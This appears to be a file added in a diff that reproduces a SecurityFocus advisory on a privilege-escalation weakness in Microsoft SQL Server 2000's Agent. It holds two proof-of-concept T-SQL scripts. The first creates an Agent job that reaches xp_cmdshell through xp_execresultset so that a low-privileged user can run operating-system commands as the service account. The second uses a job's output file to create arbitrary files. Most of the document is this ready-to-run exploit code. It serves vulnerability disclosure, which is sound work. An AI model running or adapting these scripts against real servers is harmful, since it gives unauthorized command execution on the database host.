@@ -1,0 +1,62 @@
+source: http://www.securityfocus.com/bid/5483/info
+
+Microsoft SQL Server 2000 uses an Agent which is responsible for restarting the SQL Server service, replication, and running scheduled jobs.
+
+Some of the jobs that the Agent executes have weak permissions, which could allow a user with low permissions to perform actions on the database in the context of the SQL Server Service Account when used in conjunction with the Microsoft SQL Server Extended Stored Procedure Privilege Elevation Vulnerability
+
+-- GetSystemOnSQL
+-- For this to work the SQL Agent should be running.
+-- Further, you'll need to change SERVER_NAME in
+-- sp_add_jobserver to the SQL Server of your choice
+--
+-- David Litchfield
+-- (david@ngssoftware.com)
+-- 18th July 2002
+
+USE msdb
+
+EXEC sp_add_job @job_name = 'GetSystemOnSQL',
+@enabled = 1,
+@description = 'This will give a low privileged user access to
+xp_cmdshell',
+@delete_level = 1
+
+EXEC sp_add_jobstep @job_name = 'GetSystemOnSQL',
+@step_name = 'Exec my sql',
+@subsystem = 'TSQL',
+@command = 'exec master..xp_execresultset N''select ''''exec
+master..xp_cmdshell "dir > c:\agent-job-results.txt"'''''',N''Master'''
+
+EXEC sp_add_jobserver @job_name = 'GetSystemOnSQL',
+@server_name = 'SERVER_NAME'
+
+EXEC sp_start_job @job_name = 'GetSystemOnSQL'
+
+The following proof of concept code supplied by David Litchfield <david@ngssoftware.com> will create a file called c:\sqlafc123.txt:
+
+-- ArbitraryFileCreate
+-- For this to work the SQL Agent should be running.
+-- Further, you'll need to change SERVER_NAME in
+-- sp_add_jobserver to the SQL Server of your choice
+--
+-- David Litchfield
+-- (david@ngssoftware.com)
+-- 19th August 2002
+
+USE msdb
+
+EXEC sp_add_job @job_name = 'ArbitraryFileCreate',
+@enabled = 1,
+@description = 'This will create a file called c:\sqlafc123.txt',
+@delete_level = 1
+
+EXEC sp_add_jobstep @job_name = 'ArbitraryFileCreate',
+@step_name = 'SQLAFC',
+@subsystem = 'TSQL',
+@command = 'select ''hello, this file was created by the SQL Agent.''',
+@output_file_name = 'c:\sqlafc123.txt'
+
+EXEC sp_add_jobserver @job_name = 'ArbitraryFileCreate',
+@server_name = 'SERVER_NAME'
+
+EXEC sp_start_job @job_name = 'ArbitraryFileCreate'
